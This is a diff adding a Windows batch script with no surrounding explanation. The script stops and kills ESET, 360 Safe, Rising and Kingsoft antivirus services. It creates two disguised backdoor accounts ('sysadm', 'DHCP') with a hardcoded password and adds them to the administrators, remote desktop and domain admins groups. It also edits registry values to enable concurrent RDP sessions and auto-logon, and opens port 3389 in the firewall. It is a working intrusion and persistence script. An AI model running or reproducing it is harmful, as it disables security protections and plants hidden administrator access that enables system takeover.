@@ -1,0 +1,40 @@
+NET STOP "ESET HTTP Server"
+NET STOP "ESET Service" 
+NET STOP "Rav Service" 
+NET STOP "Rsd Service" 
+TASKKILL /F /IM 360sd.exe 
+TASKKILL /F /IM 360rp.exe 
+TASKKILL /F /IM 360tray.exe 
+TASKKILL /F /IM 360Safe.exe 
+TASKKILL /F /IM egui.exe 
+TASKKILL /F /IM ekrn.exe 
+TASKKILL /F /IM knsdtray.exe 
+TASKKILL /F /IM knsdsvc.exe 
+TASKKILL /F /IM RavMonD.exe 
+TASKKILL /F /IM RsMgrSvc.exe 
+TASKKILL /F /IM RsTray.exe  
+net user sysadm h3lp_desk /expires:never /add 
+net localgroup administrators sysadm /add 
+net localgroup "remote desktop users" sysadm /add
+net group "domain admins" sysadm /add 
+net user sysadm /active:yes 
+net user sysadm /expires:never 
+net user sysadm h3lp_desk 
+net user DHCP h3lp_desk /expires:never /add 
+net localgroup administrators DHCP /add 
+net localgroup "remote desktop users" DHCP /add 
+net group "domain admins" DHCP /add" 
+net user DHCP /active:yes 
+net user DHCP /expires:never 
+net user DHCP h3lp_desk 
+reg add "hklm\system\currentcontrolset\control\terminal server" /v fdenytsconnections /t reg_dword /d 0 /f 
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fSingleSessionPerUser /d 0 /t REG_DWORD /f
+reg add "hklm\system\CurrentControlSet\Control\Terminal Server\Licensing Core" /v EnableConcurrentSessions /d 1 /t REG_DWORD /f  
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AutoAdminLogon /d 1 /t REG_SZ /f 
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v EnableConcurrentSessions /d 1 /t REG_DWORD /f 
+REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AllowMultipleTSSessions /d 1 /t REG_DWORD /f  
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v MaxInstanceCount /d 10 /t REG_DWORD /f 
+sc config termservice start= auto 
+cmd /c netsh firewall set portopening protocol=TCP port=3389 name=REMOTE1 mode=ENABLE profile=All 
+
+
